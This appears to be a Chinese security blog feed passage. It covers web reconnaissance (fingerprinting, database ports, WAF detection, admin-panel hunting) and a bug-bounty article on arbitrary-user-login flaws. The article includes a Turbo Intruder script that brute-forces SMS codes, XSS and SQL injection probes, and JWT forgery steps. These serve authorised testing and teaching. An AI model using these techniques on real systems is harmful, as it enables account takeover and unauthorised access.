    <a href="#43wappalyzer" class="header-mark"></a>4.3、wappalyzer</h3><p><a href="https://www.wappalyzer.com/" target="_blank" rel="noopener noreferrer">https://www.wappalyzer.com/</a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000ToFcy4XrIHu.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000ToFcy4XrIHu.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000ToFcy4XrIHu.jpg">
        
    </a></p>
<h3 id="44whatweb" class="headerLink">
    <a href="#44whatweb" class="header-mark"></a>4.4、WhatWeb</h3><p><a href="https://whatweb.net/" target="_blank" rel="noopener noreferrer">http://whatweb.net/</a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000persa0zggDO.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000persa0zggDO.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000persa0zggDO.jpg">
        
    </a></p>
<h3 id="45bugscaner" class="headerLink">
    <a href="#45bugscaner" class="header-mark"></a>4.5、BugScaner</h3><p><a href="http://whatweb.bugscaner.com/" target="_blank" rel="noopener noreferrer">http://whatweb.bugscaner.com/</a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002Aragw1J1nQr.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002Aragw1J1nQr.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002Aragw1J1nQr.jpg">
        
    </a></p>
<h3 id="46潮汐指纹" class="headerLink">
    <a href="#46%e6%bd%ae%e6%b1%90%e6%8c%87%e7%ba%b9" class="header-mark"></a>4.6、潮汐指纹</h3><p><a href="http://finger.tidesec.net/" target="_blank" rel="noopener noreferrer">http://finger.tidesec.net/</a></p>
<h2 id="5数据库类型" class="headerLink">
    <a href="#5%e6%95%b0%e6%8d%ae%e5%ba%93%e7%b1%bb%e5%9e%8b" class="header-mark"></a>5、数据库类型</h2><p>我们需要知道网站用的是哪种类型的数据库：Mysql、Oracle、SqlServer 还是 Access 。虽然这几种数据库的语法大体上相同，但是还是有区别的。所以我们还是要知道目标网站用的是哪种数据库，并且数据库是哪个版本的</p>
<p>各端口对应数据库类型：</p>
<p><strong>sql server&ndash;1433</strong></p>
<p><strong>oracle&ndash;1521</strong></p>
<p><strong>mysql&ndash;3306</strong></p>
<p><strong>postgresql&ndash;5432</strong></p>
<p><strong>access&ndash;默认不开放连接端口，数据库存储在FTP服务器上。</strong></p>
<p>几种数据库的区别：</p>
<p>Access 全名是Microsoft Office Access，是由微软发布的关联式数据库管理系统。小型数据库，当数据库达到100M左右的时候性能就会下降。数据库后缀名： .mdb 一般是asp的网页文件用access数据库</p>
<p>SQL Server是由Microsoft开发和推广的关系数据库管理系统（DBMS），是一个比较大型的数据库。端口号为1433。数据库后缀名 .mdf</p>
<p>MySQL 是一个关系型数据库管理系统，由瑞典MySQL AB 公司开发，目前属于 Oracle 旗下产品。MySQL是最流行的关系型数据库管理系统，在 WEB 应用方面MySQL是最好的应用软件之一，MySQL数据库大部分是php的页面。默认端口是3306</p>
<p>Oracle又名Oracle RDBMS，或简称Oracle。是甲骨文公司的一款关系数据库管理系统。常用于比较大的网站。默认端口是1521</p>
<p>首先，成本上的差距，access是不要钱的，mysql也是开源的，sql server 是收费的一般也就几千，Oracle的费用则数万。其次，处理能力，access支持千以内的访问量，sql server支持几千到上万的访问，而Oracle则支持海量的访 问。再次，从数据库的规模来看，access是小型数据库，，mysql 是中小型数据库，sql server是中型数据库，Oracle是大型数据库。</p>
<p>通常情况：access&ndash;asp mysql&ndash;php oracle&ndash;jsp sqlserver&ndash;aspx</p>
<p>postgresql&ndash;php，常见搭配：</p>
<p>ASP 和 ASPX：ACCESS、SQL Server</p>
<p>PHP：MySQL、PostgreSQL</p>
<p>JSP：Oracle、MySQL</p>
<p>端口扫描判断数据库类型的方法较为准确，但是管理员也可能选择不开放外网数据库端口，开放内网的数据库端口，也有些管理员喜欢使用站库分离的方法或者使用WAF进行拦截端口扫描来防护站点，这样我们通过端口扫描判断数据库类型的方法便有些失效了。</p>
<h2 id="6waf" class="headerLink">
    <a href="#6waf" class="header-mark"></a>6、WAF</h2><p>判断安全狗、阿里云云盾、360网站卫士、护卫神等WEB应用程序防火墙，便于采取绕过WAF的办法。</p>
<p>Nmap探测WAF有两种脚本。</p>
<p>一种是http-waf-detect。</p>
<p>命令：nmap -p80,443 &ndash;script=http-waf-detect ip</p>
<p>一种是http-waf-fingerprint。</p>
<p>命令：nmap -p80,443 &ndash;script=http-waf-fingerprint ip</p>
<p>WAFW00F探测WAF</p>
<p>命令：wafw00f -a 域名</p>
<h3 id="61在线资产识别" class="headerLink">
    <a href="#61%e5%9c%a8%e7%ba%bf%e8%b5%84%e4%ba%a7%e8%af%86%e5%88%ab" class="header-mark"></a>6.1、在线资产识别</h3><p>云悉WEB资产梳理</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001MtgSH4ZFyMn.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001MtgSH4ZFyMn.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001MtgSH4ZFyMn.jpg">
        
    </a></p>
<h3 id="62手动检测是拦截页面或者http可识别字段" class="headerLink">
    <a href="#62%e6%89%8b%e5%8a%a8%e6%a3%80%e6%b5%8b%e6%98%af%e6%8b%a6%e6%88%aa%e9%a1%b5%e9%9d%a2%e6%88%96%e8%80%85http%e5%8f%af%e8%af%86%e5%88%ab%e5%ad%97%e6%ae%b5" class="header-mark"></a>6.2、手动检测是拦截页面或者HTTP可识别字段</h3><p>在搜索框中输入XSS弹窗代码<script>alert(&lsquo;XSS&rsquo;)</script> ，WAF拦截后判断WAF。</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000gWH571I5cUi.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000gWH571I5cUi.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000gWH571I5cUi.jpg">
        
    </a></p>
<p>在可能存在的注入页面输入检测注入漏洞代码and 1=2，被WAF拦截后判断WAF。</p>
<h2 id="九后台查找" class="headerLink">
    <a href="#%e4%b9%9d%e5%90%8e%e5%8f%b0%e6%9f%a5%e6%89%be" class="header-mark"></a>九、后台查找</h2><p>·1弱口令默认后台：admin，admin/login.asp，manage，login.asp等等常见后台</p>
<p>·2查看网页的链接；一般来说，网站的主页有管理登陆类似的东西，大多数在网站底部版权处或鲁在冒页导肌程等，有些可能被管理员删掉</p>
<p>·3查看网站图片的属性有可能图片是上传大管理后台目录，但是是在前台显示</p>
<p>·4查看网站使用的管理系统，从而确定后台</p>
<p>·5用工具查找：wwwscan，intellitamper，御剑，进行爬虫、字典穷举扫描</p>
<p>·6robots.txt的帮助：robots.txt文件告诉蜘蛛程序在服务器上什么样的文件可以被查看</p>
<p>·7 GoogleHacker通过语法查找后台</p>
<p>·8查看网站使用的编辑器是否有默认后台，FCK、ewb等默认后台</p>
<p>·9短文件利用短文件漏洞进行猜解</p>
<p>·10、子域名有可能管理后台为admin.xxxxx.com、login.xxxxx.com</p>
<p>·11sqlmap-sql-shell load_file（&rsquo;d:/wwroot/index.php&rsquo;）；利用sql注入查看文件源码获取后台</p>
<p>·12社工、XSS利用社会工程系获取后台，利用存储型XSs获取后台</p>]]></description>
</item><item>
    <title>任意用户登录漏洞挖掘思路</title>
    <link>http://localhost:1313/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/</link>
    <pubDate>Sat, 20 Jan 2024 18:17:14 &#43;0800</pubDate><author>
        <name>bysec</name>
    </author><guid>http://localhost:1313/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/</guid>
    <description><![CDATA[<blockquote>
<p><em>转载自： <a href="https://forum.butian.net/share/2553" target="_blank" rel="noopener noreferrer">https://forum.butian.net/share/2553</a></em></p>
</blockquote>
<h2 id="任意用户登录漏洞挖掘思路" class="headerLink">
    <a href="#%e4%bb%bb%e6%84%8f%e7%94%a8%e6%88%b7%e7%99%bb%e5%bd%95%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e6%80%9d%e8%b7%af" class="header-mark"></a>任意用户登录漏洞挖掘思路</h2><h2 id="前言" class="headerLink">
    <a href="#%e5%89%8d%e8%a8%80" class="header-mark"></a>前言</h2><p>任意用户登录漏洞以利用漏洞利用难度低、危害高、奖金高已经成为src/众测漏洞挖掘中的香饽饽，本文将分享一下众测/src中任意用户登录漏洞的挖掘思路。</p>
<h2 id="1手机验证码问题导致的任意用户登录" class="headerLink">
    <a href="#1%e6%89%8b%e6%9c%ba%e9%aa%8c%e8%af%81%e7%a0%81%e9%97%ae%e9%a2%98%e5%af%bc%e8%87%b4%e7%9a%84%e4%bb%bb%e6%84%8f%e7%94%a8%e6%88%b7%e7%99%bb%e5%bd%95" class="header-mark"></a>1.手机验证码问题导致的任意用户登录</h2><h3 id="11-验证码爆破" class="headerLink">
    <a href="#11-%e9%aa%8c%e8%af%81%e7%a0%81%e7%88%86%e7%a0%b4" class="header-mark"></a>1.1 验证码爆破</h3><p>当登录流程使用手机验证码登录，没有图片验证码/图片验证码可重用/图片验证码简单可识别（可以使用captcha-killer-modified插件）且后端没有限制手机验证码验证错误次数时，可以尝试爆破手机验证码登录其他用户。</p>
<p>4位验证码的爆破老生常谈不再赘述；随着厂商们服务器性能的提高，服务器的rps的上升也使得6位验证码的爆破越来越快，可以使用如下方法爆破（！！！需留意服务器的rps以及测试厂商的注意事项，rps低的老系统或者厂商禁止批量爆破的项目谨慎使用6位验证码的爆破！！！）：</p>
<p>使用burpsuite的Turbo Intruder插件，编写如下脚本：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">queueRequests</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">wordlists</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">engine</span> <span class="o">=</span> <span class="n">RequestEngine</span><span class="p">(</span><span class="n">endpoint</span><span class="o">=</span><span class="n">target</span><span class="o">.</span><span class="n">endpoint</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                           <span class="n">concurrentConnections</span><span class="o">=</span><span class="mi">30</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                           <span class="n">requestsPerConnection</span><span class="o">=</span><span class="mi">30</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                           <span class="n">pipeline</span><span class="o">=</span><span class="kc">True</span>
</span></span><span class="line"><span class="cl">                           <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1000000</span><span class="p">):</span>                            <span class="c1">#生成六位验证码字典</span>
</span></span><span class="line"><span class="cl">        <span class="n">number</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="si">{:06d}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">engine</span><span class="o">.</span><span class="n">queue</span><span class="p">(</span><span class="n">target</span><span class="o">.</span><span class="n">req</span><span class="p">,</span> <span class="n">number</span><span class="o">.</span><span class="n">rstrip</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">handleResponse</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">interesting</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># currently available attributes are req.status, req.wordcount, req.length and req.response</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">req</span><span class="o">.</span><span class="n">status</span> <span class="o">&lt;</span><span class="mi">404</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;&#39;&#39;res = re.findall(&#39;Msg&#34;:&#34;(.*?)&#34;&#39;,req.response)[0]    
</span></span></span><span class="line"><span class="cl"><span class="s1">        if len(res)&gt;18:&#39;&#39;&#39;</span>    <span class="c1">#六位数的验证码爆破结果展示列太多，可根据实际情况自行筛选展示</span>
</span></span><span class="line"><span class="cl">        <span class="n">table</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>成功案例如下：</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000na0AX3EhNC1.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000na0AX3EhNC1.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000na0AX3EhNC1.jpg">
        
    </a></p>
<h3 id="12-验证码明文返回" class="headerLink">
    <a href="#12-%e9%aa%8c%e8%af%81%e7%a0%81%e6%98%8e%e6%96%87%e8%bf%94%e5%9b%9e" class="header-mark"></a>1.2 验证码明文返回</h3><p>获取手机验证码时，验证码直接在返回包里</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000SI1J74QyrXo.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000SI1J74QyrXo.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000SI1J74QyrXo.jpg">
        
    </a></p>
<h3 id="13-存在万能验证码" class="headerLink">
    <a href="#13-%e5%ad%98%e5%9c%a8%e4%b8%87%e8%83%bd%e9%aa%8c%e8%af%81%e7%a0%81" class="header-mark"></a>1.3 存在万能验证码</h3><p>一般是测试为了功能测试方便，设置了诸如000000，123456（六位验证码爆破能发现）之类的万能验证码，项目上线时忘记下掉，导致任意用户登录</p>
<h3 id="14-验证码未绑定用户" class="headerLink">
    <a href="#14-%e9%aa%8c%e8%af%81%e7%a0%81%e6%9c%aa%e7%bb%91%e5%ae%9a%e7%94%a8%e6%88%b7" class="header-mark"></a>1.4 验证码未绑定用户</h3><p>a.后端仅验证了验证码是否正确，没有验证验证码与获取手机号的对应关系，导致可以先输入自己的手机号A获取验证码，再输入他人手机号B获取验证码后，填写自己手机号A接收到的验证码，达到登录手机号B的目的</p>
<p>b.后端仅验证码了手机号与验证码是否一致，并未校验手机号是否为号主本人的,导致可以使用自己的手机号+验证码绕过。常见于用户绑定的功能处。举个栗子：</p>
<p>某系统输入商户号与手机号可绑定到该用户</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003W8q0w3aCx2L.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003W8q0w3aCx2L.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003W8q0w3aCx2L.jpg">
        
    </a></p>
<p>通过用户注册的功能处，输入自己的手机号获取验证码</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000zy9Fr1SuSVs.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000zy9Fr1SuSVs.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000zy9Fr1SuSVs.jpg">
        
    </a></p>
<p>返回绑定功能处，输入任意验证码抓包，将手机号与验证码字段改为自己的手机号+验证码</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000SKoCg2FDERP.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000SKoCg2FDERP.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000SKoCg2FDERP.jpg">
        
    </a></p>
<p>成功登录他人账号</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000UZlNh0N2Yp5.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000UZlNh0N2Yp5.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000UZlNh0N2Yp5.jpg">
        
    </a></p>
<h3 id="15-获取验证码的手机号字段可双写" class="headerLink">
    <a href="#15-%e8%8e%b7%e5%8f%96%e9%aa%8c%e8%af%81%e7%a0%81%e7%9a%84%e6%89%8b%e6%9c%ba%e5%8f%b7%e5%ad%97%e6%ae%b5%e5%8f%af%e5%8f%8c%e5%86%99" class="header-mark"></a>1.5 获取验证码的手机号字段可双写</h3><p>输入手机号获取验证码时抓包，双写手机号字段，使得两个手机号获取到同一个验证码，便可以登录其他用户</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000QoHv82xbUbX.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000QoHv82xbUbX.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000QoHv82xbUbX.jpg">
        
    </a></p>
<p>输入自己的手机号抓包，将手机字段后面加一个逗号或者分号后再加一个手机号，或者双写手机号字段phone=13333333333&amp;phone=18888888888，当两个手机号均收到一个验证码时大概率漏洞存在。使用自己的手机号便可以任意登录其他手机号</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000043wyUj4awEfc.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000043wyUj4awEfc.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000043wyUj4awEfc.jpg">
        
    </a></p>
<h3 id="16-验证码为空任意验证码可成功验证" class="headerLink">
    <a href="#16-%e9%aa%8c%e8%af%81%e7%a0%81%e4%b8%ba%e7%a9%ba%e4%bb%bb%e6%84%8f%e9%aa%8c%e8%af%81%e7%a0%81%e5%8f%af%e6%88%90%e5%8a%9f%e9%aa%8c%e8%af%81" class="header-mark"></a>1.6 验证码为空/任意验证码可成功验证</h3><p>比较奇葩的例子，验证码为空时，手机号正确则成功登录（账号密码登录体系也发现过这种情况，空密码的情况下账号存在即登录）</p>
<h2 id="2凭证安全问题导致的任意用户登录" class="headerLink">
    <a href="#2%e5%87%ad%e8%af%81%e5%ae%89%e5%85%a8%e9%97%ae%e9%a2%98%e5%af%bc%e8%87%b4%e7%9a%84%e4%bb%bb%e6%84%8f%e7%94%a8%e6%88%b7%e7%99%bb%e5%bd%95" class="header-mark"></a>2.凭证安全问题导致的任意用户登录</h2><h3 id="21-凭证泄露" class="headerLink">
    <a href="#21-%e5%87%ad%e8%af%81%e6%b3%84%e9%9c%b2" class="header-mark"></a>2.1 凭证泄露</h3><h4 id="211-页面缓存被搜索引擎抓取" class="headerLink">
    <a href="#211-%e9%a1%b5%e9%9d%a2%e7%bc%93%e5%ad%98%e8%a2%ab%e6%90%9c%e7%b4%a2%e5%bc%95%e6%93%8e%e6%8a%93%e5%8f%96" class="header-mark"></a>2.1.1 页面缓存被搜索引擎抓取</h4><p>搜索引擎搜索该域名，发现有登录后的页面被抓取，直接访问登录目标账户</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000004LgXKI1urayk.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000004LgXKI1urayk.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000004LgXKI1urayk.jpg">
        
    </a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003uTESL3QwhZY.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003uTESL3QwhZY.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003uTESL3QwhZY.jpg">
        
    </a></p>
<h4 id="212-httptracedruid等组件中的凭证泄露" class="headerLink">
    <a href="#212-httptracedruid%e7%ad%89%e7%bb%84%e4%bb%b6%e4%b8%ad%e7%9a%84%e5%87%ad%e8%af%81%e6%b3%84%e9%9c%b2" class="header-mark"></a>2.1.2 httptrace/druid等组件中的凭证泄露</h4><h5 id="httptrace" class="headerLink">
    <a href="#httptrace" class="header-mark"></a>httptrace</h5><p>spring的httptrace端点往往会记录用户的会话信息，若发现spring未授权访问且存在类似端点可以访问的话，可尝试获取用户凭证进行登录</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000011xiMV1pzBWm.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000011xiMV1pzBWm.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000011xiMV1pzBWm.jpg">
        
    </a></p>
<h5 id="durid" class="headerLink">
    <a href="#durid" class="header-mark"></a>durid</h5><p>druid的session监控若发现有效的会话信息时，可以通过此登录任意用户，将druid的未授权中危漏洞提升至高危</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000023jT9E2hL89w.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000023jT9E2hL89w.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000023jT9E2hL89w.jpg">
        
    </a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00000178axm0EEJhL.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00000178axm0EEJhL.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00000178axm0EEJhL.jpg">
        
    </a></p>
<h4 id="212-sessionkey泄露" class="headerLink">
    <a href="#212-sessionkey%e6%b3%84%e9%9c%b2" class="header-mark"></a>2.1.2 sessionkey泄露</h4><p>微信小程序官方提供了一套微信快捷登录的登录逻辑，用户授权手机号快捷登录时，会将本地的手机号使用sessionkey和iv进行aes加密，后端解密后返回该手机号的登录凭证。当sessionkey发生泄露时，攻击者便可以伪造手机号登录任意手机号</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002t9AkW3lh4F0.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002t9AkW3lh4F0.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002t9AkW3lh4F0.jpg">
        
    </a></p>
<p>修改任意手机号，利用sessionkey和iv重新加密数据</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001U8N2o2aFeSZ.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001U8N2o2aFeSZ.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001U8N2o2aFeSZ.jpg">
        
    </a></p>
<p>成功登录他人账号</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002OfGjt36xeWs.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002OfGjt36xeWs.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002OfGjt36xeWs.jpg">
        
    </a></p>
<h4 id="213-其他接口中的信息泄露" class="headerLink">
    <a href="#213-%e5%85%b6%e4%bb%96%e6%8e%a5%e5%8f%a3%e4%b8%ad%e7%9a%84%e4%bf%a1%e6%81%af%e6%b3%84%e9%9c%b2" class="header-mark"></a>2.1.3 其他接口中的信息泄露</h4><p>这个一般发现于js或者api-docs中的某些特殊接口，例如getToken之类的，有没有取决于开发有没有开发类似的功能接口</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000000i0Jp0TQS5q.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000000i0Jp0TQS5q.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000000i0Jp0TQS5q.jpg">
        
    </a></p>
<h3 id="22-凭证可伪造" class="headerLink">
    <a href="#22-%e5%87%ad%e8%af%81%e5%8f%af%e4%bc%aa%e9%80%a0" class="header-mark"></a>2.2 凭证可伪造</h3><h4 id="221-jwt未验参弱密钥" class="headerLink">
    <a href="#221-jwt%e6%9c%aa%e9%aa%8c%e5%8f%82%e5%bc%b1%e5%af%86%e9%92%a5" class="header-mark"></a>2.2.1 jwt未验参/弱密钥</h4><p>系统使用jwt作为认证字段，且其中关键用户信息字段可以遍历时，若未验参或者使用弱密钥时，便可以将用户信息字段进行更改，删除/爆破弱密钥重新生成签名，到达任意用户登录</p>
<h5 id="jwt未验参" class="headerLink">
    <a href="#jwt%e6%9c%aa%e9%aa%8c%e5%8f%82" class="header-mark"></a>jwt未验参</h5><p>删除签名部分(或者更改头部中的alg为none再删除签名)，访问登录后的接口成功访问，说明jwt未验参()</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002a1r4Q0HaM4O.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002a1r4Q0HaM4O.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002a1r4Q0HaM4O.jpg">
        
    </a></p>
<p>遍历data字段即可登录其他用户（此处的data为用户id）</p>
<h5 id="jwt弱密钥" class="headerLink">
    <a href="#jwt%e5%bc%b1%e5%af%86%e9%92%a5" class="header-mark"></a>jwt弱密钥</h5><p>jwt使用了弱密钥时，爆破到弱密钥后同样修改jwt中的用户信息字段，使用密钥重新生成签名即可获取到其他用户的jwt字段</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000004WYHBe2mCDn0.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000004WYHBe2mCDn0.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000004WYHBe2mCDn0.jpg">
        
    </a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00000029sOX2QC3cy.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00000029sOX2QC3cy.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00000029sOX2QC3cy.jpg">
        
    </a></p>
<h4 id="222-弱cookie" class="headerLink">
    <a href="#222-%e5%bc%b1cookie" class="header-mark"></a>2.2.2 弱cookie</h4><p>系统使用cookie认证，且cookie字段可伪造</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00000164AXZ1PLsjq.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00000164AXZ1PLsjq.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00000164AXZ1PLsjq.jpg">
        
    </a></p>
<h3 id="23-凭证过早返回" class="headerLink">
    <a href="#23-%e5%87%ad%e8%af%81%e8%bf%87%e6%97%a9%e8%bf%94%e5%9b%9e" class="header-mark"></a>2.3 凭证过早返回</h3><p>一般正常的登录流程为服务端校验完用户身份后，返回用户凭证，但某些系统由于登录前会有很多的查询用户信息类的功能请求，经常导致在登录验证前就返回了用户凭证。</p>
<p>某金融项目，输入手机号会先去查询手机号是否为已注册用户，是的话进入用户信息查询的逻辑，再跳转登录。在信息查询的阶段过早返回了sessionid,导致任意用户登录</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003a117v3icq28.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003a117v3icq28.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003a117v3icq28.jpg">
        
    </a></p>
<h2 id="3逻辑漏洞导致的任意用户登录" class="headerLink">
    <a href="#3%e9%80%bb%e8%be%91%e6%bc%8f%e6%b4%9e%e5%af%bc%e8%87%b4%e7%9a%84%e4%bb%bb%e6%84%8f%e7%94%a8%e6%88%b7%e7%99%bb%e5%bd%95" class="header-mark"></a>3.逻辑漏洞导致的任意用户登录</h2><h3 id="31-登录完全依赖数据包中的参数且参数可控" class="headerLink">
    <a href="#31-%e7%99%bb%e5%bd%95%e5%ae%8c%e5%85%a8%e4%be%9d%e8%b5%96%e6%95%b0%e6%8d%ae%e5%8c%85%e4%b8%ad%e7%9a%84%e5%8f%82%e6%95%b0%e4%b8%94%e5%8f%82%e6%95%b0%e5%8f%af%e6%8e%a7" class="header-mark"></a>3.1 登录完全依赖数据包中的参数且参数可控</h3><p>最常规的任意用户登录漏洞，常见于两步/多步登录的登录逻辑处</p>
<p>以两步登录为例，登录输入账号密码/手机号验证码/其他的凭证信息后第一个请求校验其正确性后，第二个请求根据后端返回的账号/手机号/用户id等字段去获取用户凭证的登录逻辑。</p>
<p>只要修改第一个请求中的返回包或者修改第二个请求中的字段即可</p>
<h4 id="修改第一个请求的返回包" class="headerLink">
    <a href="#%e4%bf%ae%e6%94%b9%e7%ac%ac%e4%b8%80%e4%b8%aa%e8%af%b7%e6%b1%82%e7%9a%84%e8%bf%94%e5%9b%9e%e5%8c%85" class="header-mark"></a>修改第一个请求的返回包</h4><p>当请求字段加密时，此方法非常便捷</p>
<p>以下为例</p>
<p>分析登录流程为，第一个请求请求微信接口获取用户手机号，返回到一个请求的返回包中</p>
<p>第二个请求获取返回包中的手机号加密发给服务端，返回其登录凭证</p>
